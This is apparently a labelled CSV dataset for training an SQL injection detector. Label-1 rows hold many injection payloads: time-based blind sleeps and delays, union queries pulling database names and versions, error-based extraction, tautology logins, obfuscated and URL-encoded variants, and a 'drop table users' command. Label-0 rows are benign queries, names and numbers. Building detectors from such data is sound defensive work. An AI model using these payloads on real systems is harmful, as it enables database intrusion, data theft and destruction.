Query,Label,cluster,stratify_col
1x8 	)   or   (/**/ select *#from;  (  select ( *sleep  (  (select (select (select (select 3))))  	)    )%  % )  ydpu  )*,1,0,1_0
"	select * from users where]id  =! '8' ||) or /(select (select;(select (select 1))))"" = |0x1}union select 6o0o1x2,version  (  +and ""l""=""l""$or (select 4) or:""h	"" not like or 0x0 or false	or	false or false#""h	""# )   --)3o4'rg,p^c",1,2,1_2
"1   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   9542  =  9542",1,4,1_4
"1)			union			select			1,database(),3 -- random_noise--#zje41e2",1,4,1_4
"8b0o1   )'[ `)  or false and true) &&  true  or  false and (select (select (select (select 1)))) and (select 1)  and  0x1 or false and true or false#<as juoe where=(select (select 8x0x0x10ea)) like 0x250a  or /*mwhc9:(select (select (select (select (select 0x2)))))m4l0o7kid	t**/0x0o135f_like   (  select count  (: * >)|  from rdb$fields as t1,rdb$types as t0b10,rdb$collations as t0x7b12,rdb$functions.as t4~ )  andtrue;--udq-jj<",1,4,1_4
select count ( * )  as climate,0,1,0_1
1'+  (`	select lqhd^where (select 0x10ba)  like  (select 0x109b) and   (  (select 0754)  like  (select 0x16f0x5)_ )  *(select (select 3739))  )  +',1,9,1_9
-9331' or   (  4519  =  2912  )  *2912 and 'rddk'  =  'rddk,1,9,1_9
obsequ.iosa,0,1,0_1
"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,1,1_1
"0o0b9'Ã¢Â  or &>
(\{select 'xhcr',fromdual^where}(select/0x19b3)=9779",1,2,1_2
"=select * from users where|id*= (select (select (select 1))) or ""%_"" or (select 1) /**/like@	(select 0b0o2) and 0x6 -- 1t0c",1,4,1_4
1%' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and '%'  =  ',1,9,1_9
-5336'  )   where 8691  =  8691 or 3608  =  1887--,1,6,1_6
5934470000000000,0,3,0_3
bettine,0,8,0_8
"1%"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,1,1,1_1
"0o5' ;%)+/**/:^)\
\asÃ¢Â pqbq@where0x549}?=+&9o0o0o0o0b0o7014",1,2,1_2
1   )    )    as tnhy where 1874  =  1874 and 2858  =  7324#,1,6,1_6
arcos de jaln,0,0,0_0
select * from should where box  between 10 and 20,0,5,0_5
17621392b,0,3,0_3
select * from capital where grabbed = 'fighting' limit 3,0,5,0_5
"-4807' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'wwki'  =  'wwki",1,9,1_9
1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,1,6,1_6
plumero,0,8,0_8
1'   )    )    as pgif where 6346  =  6346,1,6,1_6
"1%""   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  """,1,1,1_1
"  select * from all where better not in  ( 'general', 'square', 'fox' )  ",0,0,0_0
"-8893%'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   '%'  =  '",1,9,1_9
select *from  ( select column_name ( s )  from,0,1,0_1
%u0027%u0020or%u0020exists(select%u00201%u0020from%u0020users)--,1,2,1_2
select * from rhyme where slipped = 'lucky' fetch first 3 rows only,0,5,0_5
admin%u0027/**/or%u0020%u00271%u0027=%u00271,1,2,1_2
"2""   )?   ) (   ) 	 and 5x0x1b30 (~ like      (  select (select 0o0o36529)from pg_sleep ((  (select  and  ""'"" not like ""';"" or false or false#(select (select (select (select (select (select 0x0)))))))   )    )  
\and   .(  /*]n*/ (=  ( ?""rsru""]=!?""rsru@;",1,2,1_2
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1,6,1_6
select option_value from wp_options where option_name  =  '_options_number_of_preferred_partners' limit 1,0,5,0_5
select * from gravity where    not colony = 'sign',0,5,0_5
waitfor delay '0:0:5' -- random_noise--,1,0,1_0
select * from busy where took = 'buffalo',0,5,0_5
end and 'hizd'  =  'hizd,1,0,1_0
8185950000000000,0,3,0_3
select eleven ( s from nothing right join,0,7,0_7
;%u0020select%u0020pg_sleep(5);%u0020 -- random_noise--,1,0,1_0
or)a ;=/*gtqu*/	a--,1,0,1_0
"select nullif ( ""2017-08-25"", ""2017-08-25"" ) ;",0,6,0_6
"-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",1,4,1_4
9.15202e+015,0,3,0_3
"c/ zilbetiko monasterioaren, s/n,",0,0,0_0
select avg ( neck ) from leader,0,1,0_1
"1'   or   if(substring(database(),   1,   1) in/**/(1)	'a',   sleep(5),   0)   --#wau7xp1v",1,9,1_9
"1""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,4,1_4
"1' in boolean mode  )   union all select null,null#",1,4,1_4
select * from pile where safe = 'believed' limit 3,0,5,0_5
992218000000000,0,3,0_3
"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,4,1_4
"1%"")  (  select   (* case when   (  0b4x0o1b10011010b=(select 0b7b1x0b1610101001101) )  Ã¢Â then regexp_substring  (  repeat  (/*)([""*/ right !(  char  (  (select 4x173f)<.)Ã¢Â  ,0x0b0
)  ,0b0o3576625250  )  ,null$ )] or (select (select (select 0)))#`else char  (  (select (select (select (select (select (select 7x6c))))))  )  orÃ¢Â char +(  0o56"" )
   or 
char  (  (select (select (select (select 0o168))))` )    or  char /*bx6ix*/(  0o3x0x4a  )\ =end  ) {{frominformation_schema.system_users/ )   and ""%""=""",1,2,1_2
select count ( map ) from buy,0,1,0_1
select * from dish where mail = 'wet',0,5,0_5
select * from difficult where price not between 10 and 20,0,7,0_7
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",1,1,1_1
"0x1'  &&  row (  (select(select 3437)),(select 0x1d2d)  )  >^ (  select count  ((<*  )  ,concat  (  0x7171707a79,  (  select  Ã¢Â ( .elt  (  (select 0x185b)    like    9x185d,(select 0x1)   )    )     )  ,0b0o0x0o1315a767a77,flo  or    (? r and   (  (select (select 0)) +)  *0x2   ) Ã¢Â   )/*p4(gzt!j2?xle*/  x from   ( select (select~0x1448);union>select 3785_union select 0xf5b:union select (select 0x1bf2)  )/*yf)*/ a group by:x  )  ",1,4,1_4
select * from song  where shelf = frozen,0,5,0_5
fulivio,0,8,0_8
select avg ( solution ) from spell select sum ( addition ) ,0,1,0_1
" select * from users where id %=  '3' or\<\. union select (select(select (select (select 0x1)))),@@version and 0x0b1140100110101~not=(select (select (select 4x180a))) [and  'z1' not =Ã¢Â 'z0o3g' and='^(select (select 7x0)){' not like '^0x0o0b0|u' or false and true or
false -- 0o3'ju>us	",1,2,1_2
`or;*'a'/;=(	'a,1,0,1_0
"  select * from baby where our in  ( 'grown', 'single', 'examine' )  ",0,5,0_5
"1%"" union all select null,null,null,null,null,null,null,null,null#",1,4,1_4
"1'  )   as khaa where 8157  =  8157 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,4,1_4
"  select examine,coffee from short where aside = 'notice' union select triangle, nor from sets",0,7,0_7
"1)%u0020%u0020%u0020%u0020%u0020union%u0020%u0020%u0020%u0020%u0020select%u0020%u0020%u0020%u0020%u00201,database(),3--",1,2,1_2
1 and 1=1/**//*!*/and 1=1,1,6,1_6
select symbol from variety union select repeat from make order by travel,0,7,0_7
31519125v,0,3,0_3
89388462c,0,3,0_3
select * from bank where    not word = 'evidence',0,5,0_5
92793320g,0,3,0_3
zangn,0,8,0_8
"1'||  (  select 'gboi' where 4191  =  4191 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",1,9,1_9
"0b1x0o0o10 rlike> 	(  select&` ( case when  (  (select 6x1d0f)   like   (select (select (select (select 0b0x1f35)))) &) { then 0b7x4	else 1x0x0x0b8x0x0o2x1c/**/end  ;)    )+ /  &&  ""@l"" not like ""@l{"" or false && ""g"" != ""gs"" or false and true# mekk%djj b&h];(select 5);",1,2,1_2
"0""`
)  ^as rgod where 6o13147 ]=  (select (select 0b0x1394)) or 0b0x6o6043 ;==?dbms_pipe.receive_message  (  chr| ( ]0x0o0x3x72  ) ]	or chr  (  0x57  ) ` or chr  ( ^(select (select 0x62))! ):   or' chr+Ã¢Â (  0o0x5d  ) &,0o5! )* and/true  or  't&<' like:'t&<h' or '<q<3' not like '<q<3' or ""h""=""hj"" and (select (select (select (select 1970)))) like (select 0xf12)andtrue or false or false and 6x1 or (select;(select (select (select (select 0))))) or false --",1,4,1_4
keung,0,8,0_8
select thumb ( s ) from element inner join,0,1,0_1
; select pg_sleep(5); ----rabmogwequ4kvep,1,0,1_0
"'orexists(select1from/*
*/users)--",1,0,1_0
select avg ( coffee ) from club,0,1,0_1
"select atan2 ( -0.8, 2 ) ;",0,4,0_4
select top 50 percent * from pure,0,5,0_5
81e9604o6o,0,3,0_3
'/**/xor/**/'1'='1,1,9,1_9
termmetro,0,8,0_8
if  (  3392  =  4422  )   select 3392 else drop function xsqq--,1,6,1_6
select mental from double union all select were from sold order by rice,0,7,0_7
;				drop				table				users;				--,1,0,1_0
1   )    )    order by 1#,1,4,1_4
"1'+  (  select qmez where 3729  =  3729 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,4,1_4
"  select * from invented where along not in  ( 'another', 'level', 'remarkable' )  ",0,5,0_5
select * from learn fetch first 3 rows only,0,0,0_0
select size ( s ) from skill inner join,0,1,0_1
" select column_name ( s )  from break,widely",0,1,0_1
"select sleep  (  5  )   and ""%""  =  """,1,2,1_2
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'ufbr'  =  'ufbr",1,4,1_4
"1""   )    )    and 7533  =  7533 and    (    (   ""gkca""  =  ""gkca",1,2,1_2
waitfor          delay          '0:0:5'--,1,0,1_0
53424203x,0,3,0_3
"test'or'1'='1'/*/*
*/#3vqt2ecprg",1,9,1_9
"c/ el jacinto, 132,",0,0,0_0
"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh",1,4,1_4
"c/ de las violetas, 104,",0,0,0_0
"0x9%""; [)    ) ;   )  

or  (select 8o0o2o2x95ed) < like   ; (;?select count  (  *  )   from domain.domains as&t3b0x1,domain.columns^as't0o0o80,domain.tables as;t9b5  )/  and&   (   	(    ?(  ""%"" =""+""",1,2,1_2
x' or full_name like '%bob%,1,0,1_0
"' union select null, null, null -- #vjowbejsatx",1,4,1_4
"'   and   extractvalue(1,concat(0x5c,version()))----xy9rynqh0",1,0,1_0
" select:* from users&where>id   like  : '0b1' union[select^@/;zhwbma<s||0x0  or  (select (select 2x0)) and true or false or falseÃ¢Â or false and (select (select (select 1)))#w{*/c*/0x5x5,version  (    ).~ && true'--  0b1'|c[l'`",1,2,1_2
select count ( * )  as education,0,1,0_1
1   )    )    and   (  3020  =  3020  )  *6703 and    (    (   3078  =  3078,1,4,1_4
" select * from users where id /*hm8;bn6gz*/=  0o10o1& or  ""@;""= (select (select 4))+ or  (select (select (select 1))) =]9 -- 1",1,4,1_4
"-3964""  )   where 3566  =  3566 order by 1--",1,6,1_6
select avg ( nose ) from lower,0,1,0_1
5580,0,3,0_3
select scientific from many,0,7,0_7
"-9371'  )   union all select 5900,5900,5900#",1,4,1_4
"1%u0027	or	if(substring(database(),	1,	1) =	%u0027a%u0027,	sleep(5),	0)	--",1,0,1_0
"1' or if(substring(database(), 1, 1)='a', sleep(5), 0) --",1,9,1_9
"0""  and }(select 3xbee)  like  ctxsys.drithsx.sn> (  0b0b0x0o4o13707,  ( &chr,:() (select=(select (select 0b0x71)))  )   or chr  (|0x0x71: ) ` or  chr  (  (select (select 0x390))? )   or chr(( <(select (select (select 0x6d)))|^) ;/**tz;d*/or chr` (	 (select (select (select (select 0x6e))))  ) | or   (  select   (  case when   (  (select (select 0x0o0b10101a7)) like 0x17a0o1 Ã¢Â )   then{0x0x5x1/*{h && true    &&    true#)%o{+z*/else (select 0x5) end %) <
from dual  )   or chr  (  (select (select (select (select (select (select 0x2fb))))))  ) < or chr  (. 0b13101100  )* ||chr  (  0o143^ )    or  chr  (  0x0b0o0o0o7a$ )   ||`chr .( (select (select 0x0x0o107))   )  )()   _)  kj3\d",1,4,1_4
select * from bat where not pictured = 'log'  and not yet = 'citizen',0,5,0_5
select * from what,0,5,0_5
'     or     1/*!12345*/ =  1     --     #zen68983mj,1,6,1_6
"1""  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,4,1_4
select avg ( locate )  from pilot  select sum ( practice ) ,0,1,0_1
"1""   )    )    as ktue where 6392  =  6392 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1_1
select * from strike,0,5,0_5
'		or		1/**/ = 1		--,1,6,1_6
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 9081 )  order by meta_id asc",0,7,0_7
"1' or if(substring(database(), 1, 1)='a', sleep(5), 0) --#278jqo0r7",1,9,1_9
"waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",1,2,1_2
1  )   where 6039  =  6039 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,4,1_4
"%u0027 and%u00201=convert(int,@@version)--",1,0,1_0
select * from fell fetch first 50 percent rows only,0,0,0_0
"1' or   (  select 0x23d5 from  (  select count  (  *  )  ,concat  (  0x7171703a71,/*k*/ ( select  _() elt  (  (select (select (select (select 9173))))=0x23d5,(select (select (select (select 1))))   )    )     )  ,0x714a767a71,floor  ([rand  (  (select (select 0x0))  )  *(select (select 2))   ) |  )   x from inf or mation_schema.character_sets/**/group by x/)  a 	),/ and 'scye' like$'scye",1,9,1_9
"emilio arrieta, 110, 1f",0,4,0_4
"1   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   8965  =  8965",1,4,1_4
3454480000000000,0,3,0_3
25660,0,3,0_3
"=|andÃ¢Â {0b0b0b6o283b4b0o0b0b0o8x0o0x0b110o6b111=utl_inaddr.get_host_address ?\(_|  (  \select{count  ( *distinct{ (  column_name
  )  ; ) ; )from(sys.all_tab_columns{ /*\c
(select""3)vmjo{w
*/)
 *>)&. ?and@'i'< like  'i",1,2,1_2
'/**/or exists(select 1 from users)--#lsrf5za4,1,4,1_4
select * from place where finest = 'essential' limit 3,0,5,0_5
" select column_name ( s )  from saw,feature",0,1,0_1
" select * from users where}id  =( '0'
*1{union
select 5x3,banner
from v$version	where	rownum like  (select{(select 6)) and~'pq49'  like ;'pq68' or false or "";x""  like  "";x*"" or ""<""=""<m"" or 0x0 or (select 6x3) or false || false and true  or  0 -- 0o4o1'gc",1,2,1_2
8349640000000001,0,3,0_3
5849960000000000,0,3,0_3
"1' or ascii(substring(database(), 1, 1)) > 100 --#5qs3zuu",1,0,1_0
9.90463e+015,0,3,0_3
1  )   as nmlm where 9872  =  9872,1,6,1_6
' xor exists(select 1 from users)----yfx6wb4xm6,1,4,1_4
"colon 111, 13-c",0,0,0_0
select * from simplest where warm between call09/01/1996ever and everyone15/31/1996loud,0,5,0_5
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  ",1,4,1_4
stella mara,0,8,0_8
"1'  )   where 9226  =  9226 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1_1
1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,1,9,1_9
" select * from minute order by alike asc, push desc",0,7,0_7
select count ( * )  as toward,0,1,0_1
"1' or if(substring(database(), 1, 1)='a', sleep(5), 0) --",1,9,1_9
"test'or'1'='1'/*
*/--/*
*/",1,9,1_9
"   select cold, garage, brownfrom orange where coal  is not null",0,1,0_1
"1'   )    )    as efmy where 7299  =  7299 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,4,1_4
"1""   )@   )      and   0xe78  {=  % >(% select upper  (  xmltype  (  chr  (  0x5c  )    or  chr  (/*p*/ (select (select (select 0x3a)))  )   or chr  (  0x71 ) Ã¢Â  or chr ^(  (select (select (select (select (select (select 0x70))))))  )   or  chr  (  (select (select?(select (select 0x0o314))))  )
||chr  (  0x6a  )  ||chr  ([:0o151  )||(` select, (  case when / (  0b111016101050%~=  (select'(select;0b110711101010))  )   then (select (select (select (select 0x1)))) else (select 0x0o0) end}\)   from dualÃ¢Â  )    or  chr$ (  0o0x0b0o007 /*(select (select 0x6))(`i{@mut(select (select (select 0))))aeq;iwmhs6 ,,jjmf5k*/)  ||chr  (  (select (select (select (select (select/**/(select (select 122)))))))  )@   or-/**/chr{ (  0x8x4c %)  ||chr  ( ?0x3b1a  )   or chr ?(  (select 0x96)  )  ||chr  ( _8b115110   )   
)  }  )   from dual  )  %&&    (    ( : ""auyv""  like  ""auyv",1,4,1_4
zambrana,0,8,0_8
"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq",1,9,1_9
"5' or 
`(  select 'ativ';from or false and true or false or false_and true or 0o0#dual:where (select (select (select (select (select 4746)))))\\=`-(select 7x2ea) union allselect/*t|o*/null,null,null,null and ""9b9r"" not like/*jv*/""0b0o3rc""#^l[s",1,7,1_7
' or existS(seLect 1 fRom users)--,1,4,1_4
58261127b,0,3,0_3
"1' union all select null,null#",1,4,1_4
waitfor delay '0:0:5' and 'fjpf' like 'fjpf,1,0,1_0
"select;count
 ('$*  )Ã¢Â   from generate_series  (  0b0x8,(select 1x5c4b8c)  )   and  (  ""%""> like """,1,2,1_2
prdica,0,8,0_8
'/**/or/**/exists(select/**/1/**/from/**/users)--,1,0,1_0
select easily ( s )  from earn union all,0,1,0_1
"insert into aloud  ( recognize, strange, range )  values  ( 'yesterday', 'rough', 'failed' )  ",0,1,0_1
quilolitr-o,0,0,0_0
"1))  union  select  1,database(),3--#skxizdrl7jjf1k",1,4,1_4
"1' and substring(database(), 1, 1) = 's' or
'b'='b'--",1,9,1_9
select top 3 * from doubt select * from now 3select * from chamber,0,5,0_5
5988,0,3,0_3
1'   )    )    as jtmf where 3937  =  3937,1,6,1_6
select distinct trick from rain,0,7,0_7
1'+  (  select 'ggkm' where 3394  =  3394,1,6,1_6
select *into customersgermany from customers where country  =  'germany',0,5,0_5
1)union,1,4,1_4
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""khuw"" like ""khuw",1,1,1_1
select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,1,4,1_4
select * from clothes  where principle not like '[follow]%',0,7,0_7
6  )& *asÃ¢Â xylu where (select 0b0xd0a)=6xd5a rlike   (  select * from  [(Ã¢Â [select' (  sleep  (  (select (select (select 4x5))) |')    ) ;\ )Ã¢Â  sgvo  )   and  '	2' not like '1x0o1o2v';--,1,2,1_2
"-9445  )   as dmur where 4371  =  4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",1,4,1_4
"1'+  (  select jxgx where 7446  =  7446 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1_1
"'and
1=convert(int,@@version) -- random_noise--",1,6,1_6
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",1,4,1_4
"1) union select 1,database(),3 # more_noise--",1,4,1_4
3302120000000000,0,3,0_3
